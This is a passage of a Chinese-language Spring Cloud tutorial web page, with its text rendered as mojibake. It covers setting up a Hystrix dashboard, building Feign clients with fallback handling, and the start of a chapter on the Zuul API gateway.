class_">MyHystrixCommand</span>(com.netflix.hystrix.HystrixCommand.Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">&quot;&quot;</span>)), restTemplate);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myHystrixCommand.execute();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-6-Hystrixä»ªè¡¨ç›˜ç›‘æ§"><a href="#6-6-Hystrixä»ªè¡¨ç›˜ç›‘æ§" class="headerlink" title="6.6 Hystrixä»ªè¡¨ç›˜ç›‘æ§"></a>6.6 Hystrixä»ªè¡¨ç›˜ç›‘æ§</h2><p>Hystrixä»ªè¡¨ç›˜ï¼ˆHystrix Dashboardï¼‰ï¼Œå°±åƒæ±½è½¦çš„ä»ªè¡¨ç›˜å®æ—¶æ˜¾ç¤ºæ±½è½¦çš„å„é¡¹æ•°æ®ä¸€æ ·ï¼ŒHystrixä»ªè¡¨ç›˜ä¸»è¦ç”¨æ¥ç›‘æ§Hystrixçš„å®æ—¶è¿è¡ŒçŠ¶æ€ï¼Œé€šè¿‡å®ƒæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Hystrixçš„å„é¡¹æŒ‡æ ‡ä¿¡æ¯ï¼Œä»è€Œå¿«é€Ÿå‘ç°ç³»ç»Ÿä¸­å­˜åœ¨çš„é—®é¢˜è¿›è€Œè§£å†³å®ƒã€‚</p>
<p>è¦ä½¿ç”¨Hystrixä»ªè¡¨ç›˜åŠŸèƒ½ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æœ‰ä¸€ä¸ªHystrix Dashboardï¼Œè¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å¯ä»¥åœ¨åŸæ¥çš„æ¶ˆè´¹è€…åº”ç”¨ä¸Šæ·»åŠ ï¼Œè®©åŸæ¥çš„æ¶ˆè´¹è€…åº”ç”¨å…·å¤‡Hystrixä»ªè¡¨ç›˜åŠŸèƒ½ï¼Œä½†ä¸€èˆ¬åœ°ï¼Œå¾®æœåŠ¡æ¶æ„æ€æƒ³æ˜¯æ¨å´‡æœåŠ¡çš„æ‹†åˆ†ï¼ŒHystrix Dashboardä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œæ‰€ä»¥é€šå¸¸ä¼šå•ç‹¬åˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ç¨‹ä¸“é—¨ç”¨åšHystrix DashboardæœåŠ¡ï¼›</p>
<p><strong>æ­å»ºä¸€ä¸ªHystrix DashboardæœåŠ¡çš„æ­¥éª¤ï¼š</strong></p>
<p><strong>ç¬¬ä¸€æ­¥ï¼š</strong>åˆ›å»ºä¸€ä¸ªæ™®é€šçš„Spring Bootå·¥ç¨‹</p>
<p>æ¯”å¦‚åˆ›å»ºä¸€ä¸ªåä¸ºspringcloud-hystrix-dashboardçš„Spring Bootå·¥ç¨‹ï¼Œå»ºç«‹å¥½åŸºæœ¬çš„ç»“æ„å’Œé…ç½®ï¼›</p>
<p><strong>ç¬¬äºŒæ­¥ï¼š</strong>æ·»åŠ ç›¸å…³ä¾èµ–</p>
<p>åœ¨åˆ›å»ºå¥½çš„Spring Booté¡¹ç›®çš„ pom.xmlæ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³ä¾èµ–ï¼Œå¦‚ä¸‹ï¼š</p>
<p>&lt;**dependency**&gt;<br>   &lt;**groupId**&gt;org.springframework.cloud&lt;&#x2F;**groupId**&gt;<br>   &lt;**artifactId**&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;&#x2F;**artifactId**&gt;<br> &lt;&#x2F;**dependency**&gt;</p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼š</strong>å…¥å£ç±»ä¸Šæ·»åŠ æ³¨è§£</p>
<p>æ·»åŠ å¥½ä¾èµ–ä¹‹åï¼Œåœ¨å…¥å£ç±»ä¸Šæ·»åŠ @EnableHystrixDashboardæ³¨è§£å¼€å¯ä»ªè¡¨ç›˜åŠŸèƒ½ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableHystrixDashboard</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬å››æ­¥ï¼š</strong>å±æ€§é…ç½®</p>
<p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸ªäººä¹ æƒ¯é…ç½®ä¸€ä¸‹application.propertiesæ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š</p>
<p>server.port&#x3D;3721</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„Hystrixç›‘æ§ç¯å¢ƒå°±æ­å»ºå¥½äº†ï¼›</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134880.png" alt="image-20201216220216809"></p>
<p>Hystrixä»ªè¡¨ç›˜å·¥ç¨‹å·²ç»åˆ›å»ºå¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªæœåŠ¡ï¼Œè®©è¿™ä¸ªæœåŠ¡æä¾›ä¸€ä¸ªè·¯å¾„ä¸º&#x2F;actuator&#x2F;hystrix.streamæ¥å£ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨Hystrixä»ªè¡¨ç›˜æ¥å¯¹è¯¥æœåŠ¡è¿›è¡Œç›‘æ§äº†ï¼›</p>
<p>æˆ‘ä»¬æ”¹é€ æ¶ˆè´¹è€…æœåŠ¡ï¼Œè®©å…¶èƒ½æä¾›&#x2F;actuator&#x2F;hystrix.streamæ¥å£ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ¶ˆè´¹è€…é¡¹ç›®éœ€è¦æœ‰hystrixçš„ä¾èµ–ï¼š</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloudç†”æ–­å™¨èµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>éœ€è¦æœ‰ä¸€ä¸ªspring bootçš„æœåŠ¡ç›‘æ§ä¾èµ–ï¼š</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>é…ç½®æ–‡ä»¶éœ€è¦é…ç½®spring bootç›‘æ§ç«¯ç‚¹çš„è®¿é—®æƒé™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.exposure.include</span><br><span class="line">  è¿™ä¸ªæ˜¯ç”¨æ¥æš´éœ² endpoints çš„ï¼Œç”±äº endpoints ä¸­ä¼šåŒ…å«å¾ˆå¤šæ•æ„Ÿä¿¡æ¯ï¼Œé™¤äº† health å’Œ info ä¸¤ä¸ªæ”¯æŒç›´æ¥è®¿é—®å¤–ï¼Œå…¶ä»–çš„é»˜è®¤ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬è®©å®ƒéƒ½èƒ½è®¿é—®ï¼Œæˆ–è€…æŒ‡å®šï¼š</span><br><span class="line">management.endpoints.web.exposure.include=hystrix.stream</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¿é—®å…¥å£ <a href="http://localhost:8081/actuator/hystrix.stream">http://localhost:8081/actuator/hystrix.stream</a><br>æ³¨æ„ï¼šè¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œè¦è®¿é—®&#x2F;hystrix.streamæ¥å£ï¼Œé¦–å…ˆå¾—è®¿é—®consumerå·¥ç¨‹ä¸­çš„ä»»æ„ä¸€ä¸ªå…¶ä»–æ¥å£ï¼Œå¦åˆ™ç›´æ¥è®¿é—®&#x2F;hystrix.streamæ¥å£æ—¶ä¼šè¾“å‡ºå‡ºä¸€è¿ä¸²çš„ping:  ping: â€¦ï¼Œå…ˆè®¿é—®consumerä¸­çš„ä»»æ„ä¸€ä¸ªå…¶ä»–æ¥å£ï¼Œç„¶åå†è®¿é—®&#x2F;hystrix.streamæ¥å£å³å¯ï¼›</p>
</li>
</ol>
<h2 id="6-7-Hystrixä»ªè¡¨ç›˜ç›‘æ§æ•°æ®è§£è¯»"><a href="#6-7-Hystrixä»ªè¡¨ç›˜ç›‘æ§æ•°æ®è§£è¯»" class="headerlink" title="6.7 Hystrixä»ªè¡¨ç›˜ç›‘æ§æ•°æ®è§£è¯»"></a>6.7 Hystrixä»ªè¡¨ç›˜ç›‘æ§æ•°æ®è§£è¯»</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134881.png" alt="image-20201216220921983"></p>
<h1 id="ç¬¬ä¸ƒç« -å£°æ˜å¼æœåŠ¡æ¶ˆè´¹Feign"><a href="#ç¬¬ä¸ƒç« -å£°æ˜å¼æœåŠ¡æ¶ˆè´¹Feign" class="headerlink" title="ç¬¬ä¸ƒç«  å£°æ˜å¼æœåŠ¡æ¶ˆè´¹Feign"></a>ç¬¬ä¸ƒç«  å£°æ˜å¼æœåŠ¡æ¶ˆè´¹Feign</h1><h2 id="7-1-Feignæ˜¯ä»€ä¹ˆ"><a href="#7-1-Feignæ˜¯ä»€ä¹ˆ" class="headerlink" title="7-1. Feignæ˜¯ä»€ä¹ˆ"></a>7-1. Feignæ˜¯ä»€ä¹ˆ</h2><p>Feignæ˜¯Netflixå…¬å¸å¼€å‘çš„ä¸€ä¸ªå£°æ˜å¼çš„RESTè°ƒç”¨å®¢æˆ·ç«¯ï¼›</p>
<p>Ribbonè´Ÿè½½å‡è¡¡ã€HystrixæœåŠ¡ç†”æ–­æ˜¯æˆ‘ä»¬Spring Cloudä¸­è¿›è¡Œå¾®æœåŠ¡å¼€å‘éå¸¸åŸºç¡€çš„ç»„ä»¶ï¼Œåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿå‘ç°å®ƒä»¬ä¸€èˆ¬éƒ½æ˜¯åŒæ—¶å‡ºç°çš„ï¼Œè€Œä¸”é…ç½®ä¹Ÿéƒ½éå¸¸ç›¸ä¼¼ï¼Œæ¯æ¬¡å¼€å‘éƒ½æœ‰å¾ˆå¤šç›¸åŒçš„ä»£ç ï¼Œå› æ­¤Spring CloudåŸºäºNetflix Feignæ•´åˆäº†Ribbonå’ŒHystrixä¸¤ä¸ªç»„ä»¶ï¼Œè®©æˆ‘ä»¬çš„å¼€å‘å·¥ä½œå˜å¾—æ›´åŠ ç®€å•ï¼Œå°±åƒSpring Bootæ˜¯å¯¹Spring+SpringMVCçš„ç®€åŒ–ä¸€æ ·ï¼ŒSpring Cloud Feignå¯¹Ribbonè´Ÿè½½å‡è¡¡ã€HystrixæœåŠ¡ç†”æ–­è¿›è¡Œç®€åŒ–ï¼Œåœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼Œä¸ä»…åœ¨é…ç½®ä¸Šå¤§å¤§ç®€åŒ–äº†å¼€å‘å·¥ä½œï¼ŒåŒæ—¶è¿˜æä¾›äº†ä¸€ç§å£°æ˜å¼çš„WebæœåŠ¡å®¢æˆ·ç«¯å®šä¹‰æ–¹å¼ï¼›</p>
<h2 id="7-2-ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…"><a href="#7-2-ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…" class="headerlink" title="7.2 ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…"></a>7.2 ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…</h2><p>ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹é¢æ­¥éª¤è¿›è¡Œï¼š</p>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼šåˆ›å»ºæ™®é€šSpring Bootå·¥ç¨‹</p>
<p>é¦–å…ˆæˆ‘ä»¬æ¥åˆ›å»ºä¸€ä¸ªæ™®é€šçš„Spring Bootå·¥ç¨‹ï¼Œå–åä¸ºï¼š</p>
<p>05-springcloud-service-feignï¼›</p>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼šæ·»åŠ ä¾èµ–</p>
<p>è¦æ·»åŠ çš„ä¾èµ–ä¸»è¦æ˜¯spring-cloud-starter-netflix-eureka-clientå’Œspring-cloud-starter-feignï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼šæ·»åŠ æ³¨è§£</p>
<p>åœ¨é¡¹ç›®å…¥å£ç±»ä¸Šæ·»åŠ @EnableFeignClientsæ³¨è§£è¡¨ç¤ºå¼€å¯Spring Cloud Feignçš„æ”¯æŒåŠŸèƒ½ï¼›</p>
<p><strong>ç¬¬å››æ­¥</strong>ï¼šå£°æ˜æœåŠ¡</p>
<p>å®šä¹‰ä¸€ä¸ªHelloServiceæ¥å£ï¼Œé€šè¿‡@FeignClientæ³¨è§£æ¥æŒ‡å®šæœåŠ¡åç§°ï¼Œè¿›è€Œç»‘å®šæœåŠ¡ï¼Œç„¶åå†é€šè¿‡SpringMVCä¸­æä¾›çš„æ³¨è§£æ¥ç»‘å®šæœåŠ¡æä¾›è€…æä¾›çš„æ¥å£ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FeignClientè®¾ç½®å½“å‰çš„æ¥å£æ—¶ä¸€ä¸ªFeignçš„å£°æ˜å¼æ¥å£</span></span><br><span class="line"><span class="comment">//å±æ€§</span></span><br><span class="line"><span class="comment">// name ç”¨äºæŒ‡å®šæˆ‘ä»¬éœ€è¦è®¿é—®çš„æœåŠ¡æä¾›è€…çš„æœåŠ¡å</span></span><br><span class="line"><span class="meta">@FeignClient(name = &quot;07-springcloud-eureka-client-feign-provider&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line">    <span class="comment">//RequestMapping è¿™é‡Œç”¨äºåªå½“æˆ‘ä»¬éœ€è¦è®¿é—®çš„æœåŠ¡æä¾›è€…çš„è¯·æ±‚è·¯å¾„</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ç›¸å½“äºç»‘å®šäº†ä¸€ä¸ªåå«07-springcloud-eureka-client-feign-provider (è¿™é‡Œ07-springcloud-eureka-client-feign-providerå¤§å°å†™07-SPRINGCLOUD-EUREKA-CLIENT-FEIGN-PROVIDERéƒ½å¯ä»¥ ) çš„æœåŠ¡æä¾›è€…æä¾›çš„&#x2F;testæ¥å£ï¼›</p>
<p>æˆ‘ä»¬æœåŠ¡æä¾›è€…æä¾›çš„æ¥å£å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Feignçš„æœåŠ¡æä¾›è€…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äº”æ­¥</strong>ï¼šä½¿ç”¨Controllerä¸­è°ƒç”¨æœåŠ¡</p>
<p>æ¥ç€æ¥åˆ›å»ºä¸€ä¸ªControlleræ¥è°ƒç”¨ä¸Šé¢çš„æœåŠ¡ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignController</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line"></span><br><span class="line">  HelloService helloService;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/web/hello&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> helloService.hello();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>ç¬¬å…­æ­¥</strong>ï¼šå±æ€§é…ç½®</p>
<p>åœ¨application.propertiesä¸­æŒ‡å®šæœåŠ¡æ³¨å†Œä¸­å¿ƒã€ç«¯å£å·ç­‰ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#æŒ‡å®šæœåŠ¡çš„åç§° å³ä½¿æ˜¯æœåŠ¡çš„æ¶ˆè´¹è€…ä¹Ÿä¼šå°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ</span><br><span class="line">spring.application.name=<span class="number">07</span>-springcloud-eureka-client-feign-consumer</span><br><span class="line">#æŒ‡å®šEurekaæ³¨å†Œä¸­çš„è®¿é—®åœ°å€</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//localhost:9100/eureka</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬ä¸ƒæ­¥</strong>ï¼šæµ‹è¯•</p>
<p>ä¾æ¬¡å¯åŠ¨æ³¨å†Œä¸­å¿ƒã€æœåŠ¡æä¾›è€…å’Œfeignå®ç°æœåŠ¡æ¶ˆè´¹è€…ï¼Œç„¶åè®¿é—®å¦‚ä¸‹åœ°å€ï¼š<a href="http://localhost:8080/test">http://localhost:8080/test</a></p>
<h2 id="7-3-ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…çš„æµ‹è¯•"><a href="#7-3-ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…çš„æµ‹è¯•" class="headerlink" title="7.3 ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…çš„æµ‹è¯•"></a>7.3 ä½¿ç”¨Feignå®ç°æ¶ˆè´¹è€…çš„æµ‹è¯•</h2><p><strong>è´Ÿè½½å‡è¡¡ï¼š</strong></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼ŒSpring Cloud æä¾›äº†Ribbonæ¥å®ç°è´Ÿè½½å‡è¡¡ï¼Œä½¿ç”¨Ribboç›´æ¥æ³¨å…¥ä¸€ä¸ªRestTemplateå¯¹è±¡å³å¯ï¼ŒRestTemplateå·²ç»åšå¥½äº†è´Ÿè½½å‡è¡¡çš„é…ç½®ï¼›</p>
<p>åœ¨Spring Cloudä¸‹ï¼Œä½¿ç”¨Feignä¹Ÿæ˜¯ç›´æ¥å¯ä»¥å®ç°è´Ÿè½½å‡è¡¡çš„ï¼Œå®šä¹‰ä¸€ä¸ªæ³¨è§£æœ‰@FeignClientæ³¨è§£çš„æ¥å£ï¼Œç„¶åä½¿ç”¨@RequestMappingæ³¨è§£åˆ°æ–¹æ³•ä¸Šæ˜ å°„è¿œç¨‹çš„RESTæœåŠ¡ï¼Œæ­¤æ–¹æ³•ä¹Ÿæ˜¯åšå¥½è´Ÿè´£å‡è¡¡é…ç½®çš„ã€‚</p>
<p><strong>æœåŠ¡ç†”æ–­ï¼š</strong></p>
<ol>
<li><p>åœ¨application.propertiesæ–‡ä»¶å¼€å¯feignå¯¹hystrixåŠŸèƒ½æ”¯æŒï¼ˆæ”¯æŒç†”æ–­ï¼‰</p>
<p>feign.hystrix.enabled&#x3D;true</p>
</li>
<li><p>æŒ‡å®šç†”æ–­å›è°ƒé€»è¾‘</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰ç†”æ–­å™¨ç±»ï¼Œè¿™ä¸ªç±»éœ€è¦å®ç°ç”Ÿå‘½å¼æœåŠ¡æ¶ˆè´¹æ¥å£</span></span><br><span class="line"><span class="comment">//å¹¶å®ç°è¿™ä¸ªæ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼Œä¸ºè¿™ä¸ªæ¥å£æä¾›ç†”æ–­çš„å“åº”æ–¹æ³•</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFallBack</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testè¯·æ±‚ä¸å¯ç”¨è¯·ç¨åå†è¯•&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test2è¯·æ±‚ä¸å¯ç”¨è¯·ç¨åå†è¯•-------&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>æœåŠ¡ç†”æ–­è·å–å¼‚å¸¸ä¿¡æ¯ï¼š<br>ä¸º@FeignClientä¿®é¥°çš„æ¥å£åŠ ä¸Šfallbackæ–¹æ³•å¯ä»¥å®ç°è¿œç¨‹æœåŠ¡å‘ç”Ÿå¼‚å¸¸åè¿›è¡ŒæœåŠ¡çš„ç†”æ–­ï¼Œä½†æ˜¯ä¸èƒ½è·å–åˆ°è¿œç¨‹æœåŠ¡çš„å¼‚å¸¸ä¿¡æ¯ï¼Œå¦‚æœè¦è·å–è¿œç¨‹æœåŠ¡çš„å¼‚å¸¸ä¿¡æ¯ï¼Œæ€ä¹ˆåŠï¼Ÿæ­¤æ—¶å¯ä»¥ä½¿ç”¨fallbackFactory:<br>æ ·ä¾‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(name=&quot;01-springcloud-service-provider&quot;, fallbackFactory= MyFallbackFactory.class)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFallbackFactory</span> <span class="keyword">implements</span> <span class="title class_">FallbackFactory</span>&lt;HelloService&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">create</span><span class="params">(Throwable throwable)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> throwable.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="ç¬¬å…«ç« -APIç½‘å…³Zuul"><a href="#ç¬¬å…«ç« -APIç½‘å…³Zuul" class="headerlink" title="ç¬¬å…«ç«  APIç½‘å…³Zuul"></a>ç¬¬å…«ç«  APIç½‘å…³Zuul</h1><h2 id="8-1-Spring-Cloudçš„Zuulæ˜¯ä»€ä¹ˆ"><a href="#8-1-Spring-Cloudçš„Zuulæ˜¯ä»€ä¹ˆ" class="headerlink" title="8.1 Spring Cloudçš„Zuulæ˜¯ä»€ä¹ˆ"></a>8.1 Spring Cloudçš„Zuulæ˜¯ä»€ä¹ˆ</h2><p>é€šè¿‡å‰é¢å†…å®¹çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åŸºæœ¬æ­å»ºå‡ºä¸€å¥—ç®€ç•¥ç‰ˆçš„å¾®æœåŠ¡æ¶æ„äº†ï¼Œæˆ‘ä»¬æœ‰æ³¨å†Œä¸­å¿ƒEurekaï¼Œå¯ä»¥å°†æœåŠ¡æ³¨å†Œåˆ°è¯¥æ³¨å†Œä¸­å¿ƒä¸­ï¼Œæˆ‘ä»¬æœ‰Ribbonæˆ–Feignå¯ä»¥å®ç°å¯¹æœåŠ¡è´Ÿè½½å‡è¡¡åœ°è°ƒç”¨ï¼Œæˆ‘ä»¬æœ‰Hystrixå¯ä»¥å®ç°æœåŠ¡çš„ç†”æ–­ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜ç¼ºå°‘ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸ªå¾®æœåŠ¡æ¶æ„å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134882.png" alt="image-20201216223910109"></p>
<p>  åœ¨ä¸Šé¢çš„æ¶æ„å›¾ä¸­ï¼Œæˆ‘ä»¬çš„æœåŠ¡åŒ…æ‹¬ï¼šå†…éƒ¨æœåŠ¡Service Aå’Œå†…éƒ¨æœåŠ¡Service Bï¼Œè¿™ä¸¤ä¸ªæœåŠ¡éƒ½æ˜¯é›†ç¾¤éƒ¨ç½²ï¼Œæ¯ä¸ªæœåŠ¡éƒ¨ç½²äº†3ä¸ªå®ä¾‹ï¼Œä»–ä»¬éƒ½ä¼šé€šè¿‡Eureka Serveræ³¨å†Œä¸­å¿ƒæ³¨å†Œä¸è®¢é˜…æœåŠ¡ï¼Œè€ŒOpen Serviceæ˜¯ä¸€ä¸ªå¯¹å¤–çš„æœåŠ¡ï¼Œä¹Ÿæ˜¯é›†ç¾¤éƒ¨ç½²ï¼Œå¤–éƒ¨è°ƒç”¨æ–¹é€šè¿‡è´Ÿè½½å‡è¡¡è®¾å¤‡è°ƒç”¨Open ServiceæœåŠ¡ï¼Œæ¯”å¦‚è´Ÿè½½å‡è¡¡ä½¿ç”¨Nginxï¼Œè¿™æ ·çš„å®ç°æ˜¯å¦åˆç†ï¼Œæˆ–è€…æ˜¯å¦æœ‰æ›´å¥½çš„å®ç°æ–¹å¼å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬ä¸»è¦å›´ç»•è¯¥é—®é¢˜å±•å¼€è®¨è®ºã€‚</p>
<ol>
<li><p>å¦‚æœæˆ‘ä»¬çš„å¾®æœåŠ¡ä¸­æœ‰å¾ˆå¤šä¸ªç‹¬ç«‹æœåŠ¡éƒ½è¦å¯¹å¤–æä¾›æœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•å»ç®¡ç†è¿™äº›æ¥å£ï¼Ÿç‰¹åˆ«æ˜¯å½“é¡¹ç›®éå¸¸åºå¤§çš„æƒ…å†µä¸‹è¦å¦‚ä½•ç®¡ç†ï¼Ÿ</p>
</li>
